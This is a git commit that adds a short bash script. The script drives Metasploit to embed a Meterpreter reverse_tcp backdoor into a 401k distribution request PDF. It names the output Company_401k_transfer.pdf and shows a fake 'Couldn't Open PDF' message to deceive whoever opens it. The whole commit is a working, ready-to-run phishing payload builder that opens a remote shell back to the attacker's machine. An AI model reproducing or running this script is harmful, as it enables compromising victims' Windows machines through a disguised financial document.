a4247b709b46e1574a7032a43096baf98efc46b9
ehsu4220 <31673535+ehsu4220@users.noreply.github.com>
2023-04-24 14:13:41 -0400

    The target PDF and shell script
    Sample 401k transfer form w/ shell script that uses metasploit to embed reverse_tcp to generate a backdoor

---
+++ msfconsole_script.sh
@@ -0,0 +1,11 @@
+#!/bin/bash
+
+msfconsole -q -x \
+"use exploit/windows/fileformat/adobe_pdf_embedded_exe; \
+set FILENAME Company_401k_transfer.pdf; \
+set INFILENAME 401k-distribution-request-form.pdf; \
+set LAUNCH_MESSAGE Couldn't Open PDF: Something's keeping this PDF from opening; \
+set PAYLOAD windows/meterpreter/reverse_tcp; \
+set LHOST "$(hostname -I | cut -d' ' -f1)"; \
+exploit;"
+
